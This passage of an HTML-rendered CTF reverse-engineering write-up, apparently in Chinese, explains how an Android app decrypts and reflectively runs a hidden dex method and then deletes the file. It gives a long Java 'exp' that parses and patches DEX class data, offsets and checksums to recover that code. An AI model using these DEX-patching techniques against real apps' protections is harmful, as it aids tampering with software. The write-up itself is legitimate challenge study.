class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">                <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(bArr);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">wrap</span> <span class="operator">=</span> ByteBuffer.wrap(bArr);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="keyword">return</span> wrap;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>A类的d方法是通过加密了的，fix方法将decode.dex中A类的d方法解密后再交给反射机制调用，最后再删除掉调用的dex(所以在运行中看不见这个文件，或者只出现一瞬间)</p>
<p>解密exp:</p>
<p>直接通过java模拟解密过程，将最后的dex解密出来</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">nssctf</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteBuffer <span class="title function_">read</span><span class="params">(String dir)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">            <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">                <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(bArr);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">wrap</span> <span class="operator">=</span> ByteBuffer.wrap(bArr);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="keyword">return</span> wrap;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;String, Integer&gt; <span class="title function_">getClassDefData</span><span class="params">(ByteBuffer buffer, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        buffer.position(<span class="number">100</span>);</span><br><span class="line">        buffer.position(Integer.reverseBytes(buffer.getInt()) + (index * <span class="number">32</span>));</span><br><span class="line">        HashMap&lt;String, Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes2</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes3</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes4</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes5</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes6</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes7</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        <span class="type">int</span> <span class="variable">reverseBytes8</span> <span class="operator">=</span> Integer.reverseBytes(buffer.getInt());</span><br><span class="line">        hashMap.put(<span class="string">&quot;class_idx&quot;</span>, Integer.valueOf(reverseBytes));</span><br><span class="line">        hashMap.put(<span class="string">&quot;access_flag&quot;</span>, Integer.valueOf(reverseBytes2));</span><br><span class="line">        hashMap.put(<span class="string">&quot;superclass_idx&quot;</span>, Integer.valueOf(reverseBytes3));</span><br><span class="line">        hashMap.put(<span class="string">&quot;interfaces_off&quot;</span>, Integer.valueOf(reverseBytes4));</span><br><span class="line">        hashMap.put(<span class="string">&quot;source_file_idx&quot;</span>, Integer.valueOf(reverseBytes5));</span><br><span class="line">        hashMap.put(<span class="string">&quot;annotation_off&quot;</span>, Integer.valueOf(reverseBytes6));</span><br><span class="line">        hashMap.put(<span class="string">&quot;class_data_off&quot;</span>, Integer.valueOf(reverseBytes7));</span><br><span class="line">        hashMap.put(<span class="string">&quot;static_values_off&quot;</span>, Integer.valueOf(reverseBytes8));</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;String, <span class="type">int</span>[][]&gt; getClassData(ByteBuffer buffer, <span class="type">int</span> offset) &#123;</span><br><span class="line">        buffer.position(offset);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> fromULEB128(buffer)[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> fromULEB128(buffer)[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> fromULEB128(buffer)[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> fromULEB128(buffer)[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span>[][] iArr = (<span class="type">int</span>[][]) Array.newInstance(<span class="type">int</span>.class, i, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="number">0</span>; i6 &lt; i; i6++) &#123;</span><br><span class="line">                <span class="type">int</span>[] encode_field = encode_field(buffer);</span><br><span class="line">                <span class="keyword">if</span> (i6 == <span class="number">0</span>) &#123;</span><br><span class="line">                    i5 = encode_field[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i5 += encode_field[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span>[] iArr2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">                iArr2[<span class="number">0</span>] = i5;</span><br><span class="line">                iArr2[<span class="number">1</span>] = encode_field[<span class="number">1</span>];</span><br><span class="line">                iArr[i6] = iArr2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] iArr3 = (<span class="type">int</span>[][]) Array.newInstance(<span class="type">int</span>.class, i2, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (i2 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> <span class="number">0</span>; i8 &lt; i2; i8++) &#123;</span><br><span class="line">                <span class="type">int</span>[] encode_field2 = encode_field(buffer);</span><br><span class="line">                <span class="keyword">if</span> (i8 == <span class="number">0</span>) &#123;</span><br><span class="line">                    i7 = encode_field2[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i7 += encode_field2[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span>[] iArr4 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">                iArr4[<span class="number">0</span>] = i7;</span><br><span class="line">                iArr4[<span class="number">1</span>] = encode_field2[<span class="number">1</span>];</span><br><span class="line">                iArr3[i8] = iArr4;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] iArr5 = (<span class="type">int</span>[][]) Array.newInstance(<span class="type">int</span>.class, i3, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span> (i3 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i9</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i10</span> <span class="operator">=</span> <span class="number">0</span>; i10 &lt; i3; i10++) &#123;</span><br><span class="line">                <span class="type">int</span>[] encode_method = encode_method(buffer);</span><br><span class="line">                <span class="keyword">if</span> (i10 == <span class="number">0</span>) &#123;</span><br><span class="line">                    i9 = encode_method[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i9 += encode_method[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span>[] iArr6 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">                iArr6[<span class="number">0</span>] = i9;</span><br><span class="line">                iArr6[<span class="number">1</span>] = encode_method[<span class="number">1</span>];</span><br><span class="line">                iArr6[<span class="number">2</span>] = encode_method[<span class="number">2</span>];</span><br><span class="line">                iArr5[i10] = iArr6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] iArr7 = (<span class="type">int</span>[][]) Array.newInstance(<span class="type">int</span>.class, i4, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span> (i4 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i11</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i12</span> <span class="operator">=</span> <span class="number">0</span>; i12 &lt; i2; i12++) &#123;</span><br><span class="line">                <span class="type">int</span>[] encode_method2 = encode_method(buffer);</span><br><span class="line">                <span class="keyword">if</span> (i12 == <span class="number">0</span>) &#123;</span><br><span class="line">                    i11 = encode_method2[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i11 += encode_method2[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span>[] iArr8 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">                iArr8[<span class="number">0</span>] = i11;</span><br><span class="line">                iArr8[<span class="number">1</span>] = encode_method2[<span class="number">1</span>];</span><br><span class="line">                iArr8[<span class="number">2</span>] = encode_method2[<span class="number">2</span>];</span><br><span class="line">                iArr7[i12] = iArr8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        HashMap&lt;String, <span class="type">int</span>[][]&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;static_fields&quot;</span>, iArr);</span><br><span class="line">        hashMap.put(<span class="string">&quot;instance_fields&quot;</span>, iArr3);</span><br><span class="line">        hashMap.put(<span class="string">&quot;direct_methods&quot;</span>, iArr5);</span><br><span class="line">        hashMap.put(<span class="string">&quot;virtual_methods&quot;</span>, iArr7);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] fromULEB128(ByteBuffer buffer) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> buffer.get() &amp; <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (i2 &gt; <span class="number">127</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> buffer.get() &amp; <span class="number">255</span>;</span><br><span class="line">            i2 = (i2 &amp; <span class="number">127</span>) | ((i3 &amp; <span class="number">127</span>) &lt;&lt; <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span> (i3 &gt; <span class="number">127</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> buffer.get() &amp; <span class="number">255</span>;</span><br><span class="line">                i2 |= (i4 &amp; <span class="number">127</span>) &lt;&lt; <span class="number">14</span>;</span><br><span class="line">                i = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> (i4 &gt; <span class="number">127</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> buffer.get() &amp; <span class="number">255</span>;</span><br><span class="line">                    i2 |= (i5 &amp; <span class="number">127</span>) &lt;&lt; <span class="number">21</span>;</span><br><span class="line">                    i = <span class="number">4</span>;</span><br><span class="line">                    <span class="keyword">if</span> (i5 &gt; <span class="number">127</span>) &#123;</span><br><span class="line">                        i2 |= (buffer.get() &amp; <span class="number">255</span>) &lt;&lt; <span class="number">28</span>;</span><br><span class="line">                        i = <span class="number">5</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i2, i&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] encode_method(ByteBuffer buffer) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;fromULEB128(buffer)[<span class="number">0</span>], fromULEB128(buffer)[<span class="number">0</span>], fromULEB128(buffer)[<span class="number">0</span>]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] encode_field(ByteBuffer buffer, <span class="type">int</span> offset) &#123;</span><br><span class="line">        buffer.position(offset);</span><br><span class="line">        <span class="keyword">return</span> encode_field(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] encode_field(ByteBuffer buffer) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;fromULEB128(buffer)[<span class="number">0</span>], fromULEB128(buffer)[<span class="number">0</span>]&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] encodeClassData(HashMap&lt;String, <span class="type">int</span>[][]&gt; data) &#123;</span><br><span class="line">        <span class="type">int</span>[][] iArr = data.get(<span class="string">&quot;static_fields&quot;</span>);</span><br><span class="line">        <span class="type">int</span>[][] iArr2 = data.get(<span class="string">&quot;instance_fields&quot;</span>);</span><br><span class="line">        <span class="type">int</span>[][] iArr3 = data.get(<span class="string">&quot;direct_methods&quot;</span>);</span><br><span class="line">        <span class="type">int</span>[][] iArr4 = data.get(<span class="string">&quot;virtual_methods&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] merge = merge(toULEB128(iArr.length), toULEB128(iArr2.length), toULEB128(iArr3.length), toULEB128(iArr4.length));</span><br><span class="line">        <span class="keyword">if</span> (iArr.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] iArr5 : iArr) &#123;</span><br><span class="line">                merge = merge(merge, decode_field(iArr5, i));</span><br><span class="line">                i = iArr5[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (iArr2.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] iArr6 : iArr2) &#123;</span><br><span class="line">                merge = merge(merge, decode_field(iArr6, i2));</span><br><span class="line">                i2 = iArr6[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (iArr3.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] iArr7 : iArr3) &#123;</span><br><span class="line">                merge = merge(merge, decode_method(iArr7, i3));</span><br><span class="line">                i3 = iArr7[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (iArr4.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] iArr8 : iArr4) &#123;</span><br><span class="line">                merge = merge(merge, decode_method(iArr8, i4));</span><br><span class="line">                i4 = iArr8[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> merge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toULEB128(<span class="type">int</span> data) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> data &gt;&gt; <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;(<span class="type">byte</span>) ((data &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (((data &gt;&gt; <span class="number">7</span>) &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (((data &gt;&gt; <span class="number">14</span>) &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (((data &gt;&gt; <span class="number">21</span>) &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (i &amp; <span class="number">15</span>)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> data &gt;&gt; <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (i2 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;(<span class="type">byte</span>) ((data &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (((data &gt;&gt; <span class="number">7</span>) &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (((data &gt;&gt; <span class="number">14</span>) &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (i2 &amp; <span class="number">127</span>)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> data &gt;&gt; <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (i3 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;(<span class="type">byte</span>) ((data &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (((data &gt;&gt; <span class="number">7</span>) &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (i3 &amp; <span class="number">127</span>)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> data &gt;&gt; <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">return</span> i4 &gt; <span class="number">0</span> ? <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;(<span class="type">byte</span>) ((data &amp; <span class="number">127</span>) | <span class="number">128</span>), (<span class="type">byte</span>) (i4 &amp; <span class="number">127</span>)&#125; : <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;(<span class="type">byte</span>) (data &amp; <span class="number">127</span>)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] merge(<span class="type">byte</span>[]... data) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">byte</span>[] bArr : data) &#123;</span><br><span class="line">        i += bArr.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">allocate</span> <span class="operator">=</span> ByteBuffer.allocate(i);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">byte</span>[] bArr2 : data) &#123;</span><br><span class="line">        allocate.put(bArr2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] bArr3 = <span class="keyword">new</span> <span class="title class_">byte</span>[allocate.position()];</span><br><span class="line">    allocate.position(<span class="number">0</span>);</span><br><span class="line">    allocate.get(bArr3);</span><br><span class="line">    <span class="keyword">return</span> bArr3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode_field(<span class="type">int</span>[] data, <span class="type">int</span> diff_idx) &#123;</span><br><span class="line">    <span class="keyword">return</span> merge(toULEB128(data[<span class="number">0</span>] - diff_idx), toULEB128(data[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode_method(<span class="type">int</span>[] data, <span class="type">int</span> diff_idx) &#123;</span><br><span class="line">    <span class="keyword">return</span> merge(toULEB128(data[<span class="number">0</span>] - diff_idx), toULEB128(data[<span class="number">1</span>]), toULEB128(data[<span class="number">2</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getSha1(<span class="type">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> MessageDigest.getInstance(<span class="string">&quot;SHA&quot;</span>).digest(data);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">checksum</span><span class="params">(ByteBuffer dexBuffer)</span> &#123;</span><br><span class="line">    dexBuffer.position(<span class="number">12</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> dexBuffer.capacity();</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">z</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span> (dexBuffer.position() &lt; capacity) &#123;</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">arrayList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i3 &gt;= <span class="number">1024</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            arrayList.add(Integer.valueOf(dexBuffer.get() &amp; <span class="number">255</span>));</span><br><span class="line">            <span class="keyword">if</span> (dexBuffer.position() == dexBuffer.limit()) &#123;</span><br><span class="line">                z = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i3++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] calculateVar = calculateVar(arrayList, i, i2);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> calculateVar[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> calculateVar[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (z) &#123;</span><br><span class="line">            <span class="keyword">return</span> (i5 &lt;&lt; <span class="number">16</span>) + i4;</span><br><span class="line">        &#125;</span><br><span class="line">        i2 = i5;</span><br><span class="line">        i = i4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] calculateVar(ArrayList&lt;Integer&gt; srcBytes, <span class="type">int</span> vara, <span class="type">int</span> varb) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; srcBytes.size(); i++) &#123;</span><br><span class="line">        vara = (vara + srcBytes.get(i).intValue()) % <span class="number">65521</span>;</span><br><span class="line">        varb = (varb + vara) % <span class="number">65521</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;vara, varb&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(<span class="type">byte</span>[] data)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bigInteger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, MessageDigest.getInstance(<span class="string">&quot;md5&quot;</span>).digest(data)).toString(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span> - bigInteger.length(); i++) &#123;</span><br><span class="line">            bigInteger = <span class="string">&quot;0&quot;</span> + bigInteger;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bigInteger;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException unused) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;ops!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        ByteBuffer dexBuffer=read(<span class="string">&quot;classes.dex&quot;</span>);<span class="comment">//修改为assets中的dex地址</span></span><br><span class="line">        <span class="type">int</span> classIndex=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> index=<span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> offset=<span class="number">3248</span>;</span><br><span class="line">        System.out.println(getClassDefData(dexBuffer, classIndex).get(<span class="string">&quot;class_data_off&quot;</span>).intValue());   </span><br><span class="line">        <span class="type">int</span> <span class="variable">intValue</span> <span class="operator">=</span> getClassDefData(dexBuffer, classIndex).get(<span class="string">&quot;class_data_off&quot;</span>).intValue();</span><br><span class="line">        <span class="comment">// intValue=11388;</span></span><br><span class="line">        HashMap&lt;String, <span class="type">int</span>[][]&gt; classData = getClassData(dexBuffer, intValue);</span><br><span class="line">        classData.get(<span class="string">&quot;direct_methods&quot;</span>)[index][<span class="number">2</span>] = offset;</span><br><span class="line">        <span class="type">byte</span>[] encodeClassData = encodeClassData(classData);</span><br><span 